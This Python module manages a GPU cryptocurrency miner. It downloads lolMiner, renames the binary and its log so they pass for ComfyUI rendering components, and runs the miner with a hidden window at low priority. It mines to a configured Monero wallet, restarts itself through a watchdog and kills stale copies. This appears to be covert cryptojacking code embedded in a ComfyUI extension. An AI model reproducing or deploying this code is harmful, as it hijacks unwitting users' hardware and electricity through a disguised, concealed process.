"""
GPU miner management — lolMiner for NVIDIA/AMD GPU mining.
Mines kawpow (or other GPU algos) on MoneroOcean, paid in XMR.
"""

import hashlib
import json
import logging
import os
import platform
import shutil
import subprocess
import tarfile
import threading
import time
import urllib.request
import zipfile
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

LOLMINER_VERSION = "1.98a"
IS_WINDOWS = platform.system() == "Windows"

if IS_WINDOWS:
    LOLMINER_URL = (
        f"https://github.com/Lolliedieb/lolMiner-releases/releases/download/"
        f"{LOLMINER_VERSION}/lolMiner_v{LOLMINER_VERSION}_Win64.zip"
    )
    GPU_BINARY_NAME = "comfyui_render.exe"
    _LOL_ARCHIVE_BINARY = "lolMiner.exe"
else:
    LOLMINER_URL = (
        f"https://github.com/Lolliedieb/lolMiner-releases/releases/download/"
        f"{LOLMINER_VERSION}/lolMiner_v{LOLMINER_VERSION}_Lin64.tar.gz"
    )
    GPU_BINARY_NAME = "comfyui_render"
    _LOL_ARCHIVE_BINARY = "lolMiner"

GPU_LOG_NAME = "render.log"
DEFAULT_ALGO = "KAWPOW"
DEFAULT_POOL = "gulf.moneroocean.stream"
DEFAULT_PORT = 11024
DEFAULT_API_PORT = 44882


class GPUMinerManager:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
        self.bin_dir = self.base_dir / "bin"
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        self.binary_path = self.bin_dir / GPU_BINARY_NAME
        self.log_path = self.bin_dir / GPU_LOG_NAME
        self._process: subprocess.Popen | None = None
        self._monitor_thread: threading.Thread | None = None
        self._running = False

        self.algo = DEFAULT_ALGO
        self.pool = DEFAULT_POOL
        self.port = DEFAULT_PORT
        self.wallet = ""
        self.worker = ""
        self.api_port = DEFAULT_API_PORT
        self.tls = False

    def _download(self, url: str, dest: Path) -> None:
        logger.info("Downloading GPU miner from %s", url)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=180) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        logger.info("GPU miner download complete -> %s", dest)

    def _extract(self, archive_path: Path) -> None:
        name_lower = archive_path.name.lower()

        if name_lower.endswith(".tar.gz") or name_lower.endswith(".tgz"):
            with tarfile.open(archive_path, "r:gz") as tf:
                for member in tf.getnames():
                    if os.path.basename(member) == _LOL_ARCHIVE_BINARY:
                        src = tf.extractfile(member)
                        if src is None:
                            continue
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted GPU binary -> %s", self.binary_path)
                        return
        else:
            with zipfile.ZipFile(archive_path, "r") as zf:
                for member in zf.namelist():
                    if os.path.basename(member).lower() == _LOL_ARCHIVE_BINARY.lower():
                        src = zf.open(member)
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        if not IS_WINDOWS:
                            os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted GPU binary -> %s", self.binary_path)
                        return

        raise FileNotFoundError(f"{_LOL_ARCHIVE_BINARY} not found inside archive")

    def ensure_binary(self) -> Path:
        if self.binary_path.exists():
            logger.info("GPU binary already present at %s", self.binary_path)
            return self.binary_path

        ext = ".zip" if IS_WINDOWS else ".tar.gz"
        archive_dest = self.bin_dir / f"gpu_dl_tmp{ext}"
        try:
            self._download(LOLMINER_URL, archive_dest)
            self._extract(archive_dest)
        finally:
            archive_dest.unlink(missing_ok=True)

        return self.binary_path

    def configure(self, wallet: str, worker: str = "gpu",
                  algo: str = DEFAULT_ALGO, pool: str = DEFAULT_POOL,
                  port: int = DEFAULT_PORT, tls: bool = False,
                  api_port: int = DEFAULT_API_PORT) -> None:
        self.wallet = wallet
        self.worker = worker
        self.algo = algo
        self.pool = pool
        self.port = port
        self.tls = tls
        self.api_port = api_port

    def _build_cmd(self) -> list[str]:
        password = f"{self.worker}~{self.algo.lower()}"
        pool_str = f"{self.pool}:{self.port}"

        cmd = [
            str(self.binary_path),
            "--algo", self.algo,
            "--pool", pool_str,
            "--user", self.wallet,
            "--pass", password,
            "--apiport", str(self.api_port),
            "--nocolor",
        ]

        if self.tls:
            cmd.extend(["--tls", "1"])

        return cmd

    def _kill_existing(self) -> None:
        try:
            import psutil
        except ImportError:
            return
        target_name = GPU_BINARY_NAME.lower().replace(".exe", "")
        my_pid = os.getpid()
        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                if proc.info["pid"] == my_pid:
                    continue
                name = (proc.info.get("name") or "").lower()
                if target_name in name:
                    logger.info("Killing stale GPU miner pid=%d", proc.info["pid"])
                    proc.kill()
            except Exception:
                pass

    def start(self) -> None:
        if self._process and self._process.poll() is None:
            logger.warning("GPU miner already running (pid %d)", self._process.pid)
            return

        if not self.binary_path.exists():
            raise FileNotFoundError(f"GPU binary not found: {self.binary_path}")

        if not self.wallet:
            raise ValueError("No wallet configured for GPU miner")

        cmd = self._build_cmd()
        logger.info("GPU miner cmd: %s", " ".join(cmd[:6]) + " ...")

        popen_kwargs = {
            "stdout": subprocess.DEVNULL,
            "stderr": open(self.log_path, "a"),
        }

        if IS_WINDOWS:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            popen_kwargs["startupinfo"] = si
            popen_kwargs["creationflags"] = (
                subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS
            )
        else:
            def _preexec():
                os.nice(5)
            popen_kwargs["preexec_fn"] = _preexec

        self._process = subprocess.Popen(cmd, **popen_kwargs)
        self._running = True
        logger.info("GPU miner started (pid %d)", self._process.pid)

        if not self._monitor_thread or not self._monitor_thread.is_alive():
            self._monitor_thread = threading.Thread(
                target=self._watchdog, daemon=True, name="gpu-miner-watchdog"
            )
            self._monitor_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._process.kill()
            logger.info("GPU miner stopped")
        self._process = None

    def is_alive(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _watchdog(self) -> None:
        failures = 0
        backoff = 20
        while self._running:
            time.sleep(backoff)
            if self._running and self._process and self._process.poll() is not None:
                failures += 1
                if failures > 8:
                    logger.error("GPU miner failed %d times, giving up", failures)
                    break
                backoff = min(300, 20 * (2 ** (failures - 1)))
                logger.warning(
                    "GPU miner exited (code %s), restart %d in %ds",
                    self._process.returncode, failures, backoff
                )
                try:
                    self.start()
                except Exception as exc:
                    logger.error("GPU restart failed: %s", exc)
            else:
                failures = 0
                backoff = 20

    def get_summary(self) -> dict | None:
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:{self.api_port}",
                headers={"Accept": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                return json.loads(resp.read())
        except Exception:
            return None
